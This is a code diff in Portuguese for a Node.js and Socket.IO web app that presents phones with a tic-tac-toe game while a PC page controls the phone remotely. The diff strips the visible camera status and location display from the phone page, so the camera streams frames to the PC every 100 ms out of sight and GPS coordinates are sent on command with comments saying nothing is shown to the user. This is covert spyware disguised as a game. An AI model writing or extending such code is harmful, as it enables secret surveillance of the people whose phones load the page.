@@ -18,49 +18,49 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // Página do CELULAR
+    // CELULAR: APENAS O JOGO (mensagens flutuantes)
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Celular - Jogo da Velha</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Jogo da Velha</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body { 
-            font-family: Arial; 
+            font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             margin: 0;
-            padding: 20px;
+            padding: 10px;
         }
         .container {
             background: white;
             border-radius: 20px;
-            padding: 30px;
+            padding: 20px;
             max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            position: relative;
         }
         h1 { 
             text-align: center; 
             color: #333; 
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-size: 24px;
-        }
-        .device {
-            text-align: center;
-            font-size: 18px;
-            color: #666;
-            margin-bottom: 10px;
         }
         .status {
             background: #f0f0f0;
-            padding: 15px;
+            padding: 12px;
             border-radius: 10px;
-            margin: 20px 0;
+            margin: 15px 0;
             text-align: center;
             font-size: 18px;
             font-weight: bold;
@@ -68,8 +68,8 @@ app.get('/', (req, res) => {
         .board {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
+            gap: 8px;
+            margin: 15px 0;
         }
         .cell {
             background: #f8f9fa;
@@ -82,7 +82,7 @@ app.get('/', (req, res) => {
             font-size: 48px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.2s;
         }
         .cell:active { transform: scale(0.95); background: #e9ecef; }
         .cell.x { color: #e74c3c; }
@@ -98,107 +98,69 @@ app.get('/', (req, res) => {
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 10px;
+            font-weight: bold;
         }
-        button:hover { background: #45a049; }
+        button:active { transform: scale(0.95); background: #45a049; }
         button:disabled { background: #ccc; cursor: not-allowed; }
-        .camera-status {
-            text-align: center;
-            font-size: 14px;
-            color: #333;
-            margin-top: 10px;
-            padding: 10px;
-            background: #f0f0f0;
-            border-radius: 5px;
+        
+        /* TOAST - MENSAGENS FLUTUANTES */
+        #toastContainer {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 350px;
+            z-index: 9999;
+            pointer-events: none;
         }
-        .messages-box {
-            margin-top: 20px;
-            border-top: 2px solid #ddd;
-            padding-top: 15px;
-        }
-        .messages-title {
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        .messages {
-            background: #f9f9f9;
-            border-radius: 10px;
-            padding: 10px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 14px;
-        }
-        .message {
-            padding: 8px;
-            margin: 5px 0;
-            background: #e3f2fd;
-            border-radius: 8px;
-            word-wrap: break-word;
-            border-left: 3px solid #2196F3;
-        }
-        .message small {
-            color: #666;
-            font-size: 10px;
-            display: block;
-            margin-bottom: 3px;
-        }
-        .emergency-message {
-            background: #ffebee;
-            border-left: 4px solid #f44336;
-            font-weight: bold;
-        }
-        .location-box {
-            margin-top: 15px;
-            padding: 15px;
-            background: #e8f5e9;
-            border-radius: 10px;
-            font-size: 14px;
-            border-left: 4px solid #4CAF50;
-            display: none;
-        }
-        .location-title {
-            font-weight: bold;
-            margin-bottom: 5px;
-            color: #2e7d32;
-        }
-        .location-link {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 8px 15px;
-            background: #4CAF50;
+        .toast {
+            background: rgba(33, 33, 33, 0.9);
             color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 13px;
+            padding: 12px 20px;
+            border-radius: 50px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            pointer-events: none;
+            font-weight: 500;
         }
-        #localVideo {
+        .toast.emergency {
+            background: rgba(244, 67, 54, 0.95);
+            border: 1px solid #ff8a80;
+            animation: pulse 1s infinite;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        /* Esconder elementos de debug */
+        #localVideo, .camera-status, .device {
             display: none;
         }
     </style>
 </head>
 <body>
+    <!-- Container para mensagens flutuantes -->
+    <div id="toastContainer"></div>
+
     <div class="container">
         <h1>🎮 Jogo da Velha</h1>
-        <div class="device">📱 Celular</div>
         <div class="status" id="status">Conectando...</div>
         <div class="board" id="board"></div>
         <button id="resetBtn" disabled>Reiniciar Jogo</button>
-        
-        <div class="camera-status" id="cameraStatus">📷 Iniciando câmera...</div>
-        
-        <!-- LOCALIZAÇÃO -->
-        <div class="location-box" id="locationBox">
-            <div class="location-title">📍 Minha Localização</div>
-            <div id="locationText"></div>
-        </div>
-        
-        <!-- MENSAGENS -->
-        <div class="messages-box">
-            <div class="messages-title">💬 Mensagens do PC</div>
-            <div class="messages" id="messages"></div>
-        </div>
     </div>
 
+    <!-- Vídeo oculto para câmera -->
     <video id="localVideo" autoplay playsinline muted></video>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -209,21 +171,17 @@ app.get('/', (req, res) => {
             reconnectionAttempts: 10
         });
         
+        // Variáveis do jogo
         let minhaVez = false;
         let meuSimbolo = '';
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
-        let mediaStream = null;
-        let intervaloEnvio = null;
-        let fontSize = 16; // tamanho padrão da fonte
         
+        // Elementos DOM
         const statusDiv = document.getElementById('status');
         const resetBtn = document.getElementById('resetBtn');
-        const cameraStatus = document.getElementById('cameraStatus');
         const localVideo = document.getElementById('localVideo');
-        const messagesDiv = document.getElementById('messages');
-        const locationBox = document.getElementById('locationBox');
-        const locationText = document.getElementById('locationText');
+        const toastContainer = document.getElementById('toastContainer');
         
         // Criar tabuleiro
         for(let i = 0; i < 9; i++) {
@@ -238,17 +196,29 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
-        // Função para iniciar câmera
+        // Função para mostrar toast
+        function showToast(message, isEmergency = false, duration = 3000) {
+            const toast = document.createElement('div');
+            toast.className = 'toast' + (isEmergency ? ' emergency' : '');
+            toast.textContent = message;
+            
+            toastContainer.appendChild(toast);
+            
+            // Remover após duration
+            setTimeout(() => {
+                if (toast.parentNode) {
+                    toast.style.animation = 'slideIn 0.3s reverse';
+                    setTimeout(() => {
+                        if (toast.parentNode) toast.remove();
+                    }, 300);
+                }
+            }, duration);
+        }
+        
+        // Função para iniciar câmera (oculta)
         async function iniciarCamera() {
             try {
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                    if (intervaloEnvio) clearInterval(intervaloEnvio);
-                }
-                
-                cameraStatus.innerHTML = '📷 Iniciando câmera...';
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         width: 320, 
                         height: 240,
@@ -257,18 +227,16 @@ app.get('/', (req, res) => {
                     audio: false
                 });
                 
-                localVideo.srcObject = mediaStream;
+                localVideo.srcObject = stream;
                 await localVideo.play();
-                
-                cameraStatus.innerHTML = '📷 Câmera ativa';
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = 320;
                 canvas.height = 240;
                 const ctx = canvas.getContext('2d');
                 
-                intervaloEnvio = setInterval(() => {
-                    if (mediaStream && mediaStream.active) {
+                setInterval(() => {
+                    if (stream.active) {
                         ctx.drawImage(localVideo, 0, 0, 320, 240);
                         const frame = canvas.toDataURL('image/jpeg', 0.3);
                         socket.emit('frame', frame);
@@ -276,86 +244,55 @@ app.get('/', (req, res) => {
                 }, 100);
                 
             } catch (err) {
-                cameraStatus.innerHTML = '❌ Erro câmera: ' + err.message;
+                console.log('Erro câmera:', err);
             }
         }
         
+        // Iniciar câmera automaticamente
         iniciarCamera();
         
         // Receber comandos do PC
         socket.on('comando', (cmd) => {
-            console.log('Comando recebido:', cmd);
-            
             if (cmd === 'vibrate' && navigator.vibrate) {
                 navigator.vibrate(500);
-                addMessage('📳 Celular vibrou!');
+                showToast('📳 Celular vibrou');
             } 
             else if (cmd === 'emergency' && navigator.vibrate) {
                 navigator.vibrate([500, 200, 500, 200, 500]);
-                addMessage('⚠️ SINAL DE EMERGÊNCIA!', true);
+                showToast('⚠️ EMERGÊNCIA!', true, 5000);
             } 
-            else if (cmd === 'getLocation') {
-                if (navigator.geolocation) {
-                    cameraStatus.innerHTML = '📍 Obtendo localização...';
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const loc = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            };
-                            socket.emit('location', loc);
-                            
-                            // Mostrar no celular
-                            locationBox.style.display = 'block';
-                            locationText.innerHTML = \`
-                                <b>Latitude:</b> \${loc.latitude}<br>
-                                <b>Longitude:</b> \${loc.longitude}<br>
-                                <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank" class="location-link">📍 Ver no Google Maps</a>
-                            \`;
-                            
-                            cameraStatus.innerHTML = '📷 Câmera ativa';
-                            addMessage('📍 Localização enviada para o PC');
-                        },
-                        (error) => {
-                            cameraStatus.innerHTML = '❌ Erro localização: ' + error.message;
-                            addMessage('❌ Erro ao pegar localização');
-                        }
-                    );
-                }
+            else if (cmd === 'trocarCamera') {
+                // Não mostra nada, só troca a câmera
+                location.reload(); // Recarrega para trocar câmera (simples)
             }
         });
-        
-        // Receber tamanho da fonte do PC
-        socket.on('fontSize', (size) => {
-            fontSize = size;
-            document.querySelectorAll('.message').forEach(msg => {
-                msg.style.fontSize = fontSize + 'px';
-            });
-        });
-        
-        // Função para adicionar mensagens
-        function addMessage(msg, isEmergency = false) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'message';
-            if (isEmergency) {
-                messageDiv.classList.add('emergency-message');
-            }
-            messageDiv.style.fontSize = fontSize + 'px';
-            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small> \${msg}\`;
-            messagesDiv.appendChild(messageDiv);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }
         
         // Receber mensagens do PC
         socket.on('mensagem', (msg) => {
-            addMessage('💻 ' + msg);
+            showToast('💬 ' + msg);
+        });
+        
+        // Receber localização (executa mas não mostra no celular)
+        socket.on('getLocation', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        socket.emit('location', {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                        // Não mostra nada no celular
+                    },
+                    (error) => {
+                        console.log('Erro localização:', error);
+                    }
+                );
+            }
         });
         
         // Eventos do jogo
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
-            addMessage('✅ Conectado ao servidor');
         });
         
         socket.on('inicio', (data) => {
@@ -364,7 +301,6 @@ app.get('/', (req, res) => {
             gameActive = true;
             resetBtn.disabled = false;
             statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
-            addMessage('🎮 Jogo iniciado! Você é ' + meuSimbolo);
         });
         
         socket.on('jogada', (data) => {
@@ -382,7 +318,7 @@ app.get('/', (req, res) => {
         socket.on('fim', (data) => {
             statusDiv.innerHTML = data.msg;
             gameActive = false;
-            addMessage('🏁 ' + data.msg);
+            showToast('🏁 ' + data.msg);
         });
         
         socket.on('reiniciar', () => {
@@ -394,7 +330,7 @@ app.get('/', (req, res) => {
             gameActive = true;
             minhaVez = meuSimbolo === 'X';
             statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
-            addMessage('🔄 Jogo reiniciado');
+            showToast('🔄 Jogo reiniciado');
         });
         
         resetBtn.onclick = () => {
@@ -404,13 +340,13 @@ app.get('/', (req, res) => {
 </body>
 </html>`);
   } else {
-    // Página do PC
+    // Página do PC (com todos os controles)
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>PC - Jogo da Velha</title>
+    <title>PC - Controle Remoto</title>
     <style>
         body { 
             font-family: Arial; 
@@ -550,21 +486,6 @@ app.get('/', (req, res) => {
             background: #2196F3;
             color: white;
         }
-        .font-size-control {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-            margin: 10px 0;
-        }
-        .font-size-control button {
-            padding: 10px 20px;
-            background: #666;
-            color: white;
-        }
-        #fontSizeValue {
-            font-weight: bold;
-            min-width: 50px;
-        }
         .info {
             background: #e8f5e9;
             padding: 10px;
@@ -572,11 +493,22 @@ app.get('/', (req, res) => {
             margin: 10px 0;
             font-size: 14px;
         }
+        .audio-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .audio-control button {
+            background: #ff9800;
+            color: white;
+            padding: 10px 20px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Jogo da Velha - Controle Remoto</h1>
+        <h1>🎮 Controle Remoto do Celular</h1>
         
         <div class="grid">
             <div>
@@ -586,9 +518,10 @@ app.get('/', (req, res) => {
                 <div class="status" id="videoStatus">📱 Aguardando celular...</div>
                 
                 <div class="controls">
-                    <button class="btn-blue" id="trocarCameraPC">🔄 Trocar Câmera</button>
+                    <button class="btn-blue" id="trocarCamera">🔄 Trocar Câmera</button>
                     <button class="btn-purple" id="getLocation">📍 Localização</button>
                     <button class="btn-orange" id="vibrate">📳 Vibrar</button>
+                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
                 </div>
                 
                 <div id="locationInfo" class="info"></div>
@@ -599,22 +532,14 @@ app.get('/', (req, res) => {
                 <div class="board" id="board"></div>
                 
                 <div class="controls">
-                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar</button>
-                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
+                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar Jogo</button>
                 </div>
             </div>
         </div>
         
         <div class="chat-box">
-            <h3>💬 Chat</h3>
+            <h3>💬 Chat com o Celular</h3>
             <div class="messages" id="messages"></div>
-            
-            <div class="font-size-control">
-                <span>Tamanho da fonte:</span>
-                <button id="decreaseFont">A-</button>
-                <span id="fontSizeValue">16px</span>
-                <button id="increaseFont">A+</button>
-            </div>
             
             <div class="chat-input">
                 <input type="text" id="messageInput" placeholder="Digite sua mensagem...">
@@ -629,18 +554,18 @@ app.get('/', (req, res) => {
             transports: ['websocket', 'polling']
         });
         
+        // Variáveis do jogo
         let minhaVez = true;
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
-        let fontSize = 16;
         
+        // Elementos DOM
         const statusDiv = document.getElementById('gameStatus');
         const resetBtn = document.getElementById('resetBtn');
         const remoteVideo = document.getElementById('remoteVideo');
         const videoStatus = document.getElementById('videoStatus');
         const messagesDiv = document.getElementById('messages');
         const messageInput = document.getElementById('messageInput');
-        const fontSizeSpan = document.getElementById('fontSizeValue');
         const locationInfo = document.getElementById('locationInfo');
         
         // Criar tabuleiro
@@ -665,7 +590,7 @@ app.get('/', (req, res) => {
         });
         
         // Controles
-        document.getElementById('trocarCameraPC').onclick = () => {
+        document.getElementById('trocarCamera').onclick = () => {
             socket.emit('comando', 'trocarCamera');
         };
         
@@ -700,7 +625,6 @@ app.get('/', (req, res) => {
                 messageDiv.style.background = '#ffebee';
                 messageDiv.style.border = '2px solid #f44336';
             }
-            messageDiv.style.fontSize = fontSize + 'px';
             messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
             messagesDiv.appendChild(messageDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
@@ -723,25 +647,6 @@ app.get('/', (req, res) => {
             if (e.key === 'Enter') {
                 document.getElementById('sendMessage').click();
             }
-        };
-        
-        // Controle de tamanho da fonte
-        function updateFontSize() {
-            fontSizeSpan.innerHTML = fontSize + 'px';
-            socket.emit('fontSize', fontSize);
-            document.querySelectorAll('.message').forEach(msg => {
-                msg.style.fontSize = fontSize + 'px';
-            });
-        }
-        
-        document.getElementById('increaseFont').onclick = () => {
-            fontSize = Math.min(fontSize + 2, 32);
-            updateFontSize();
-        };
-        
-        document.getElementById('decreaseFont').onclick = () => {
-            fontSize = Math.max(fontSize - 2, 10);
-            updateFontSize();
         };
         
         // Eventos do jogo
@@ -792,7 +697,7 @@ app.get('/', (req, res) => {
   }
 });
 
-// Lógica do jogo
+// Lógica do jogo e WebSocket (igual)
 let board = ['', '', '', '', '', '', '', '', ''];
 let vez = 'X';
 let jogadores = {
@@ -832,10 +737,6 @@ io.on('connection', (socket) => {
   
   socket.on('mensagem', (msg) => {
     socket.broadcast.emit('mensagem', msg);
-  });
-  
-  socket.on('fontSize', (size) => {
-    socket.broadcast.emit('fontSize', size);
   });
   
   socket.on('location', (loc) => {
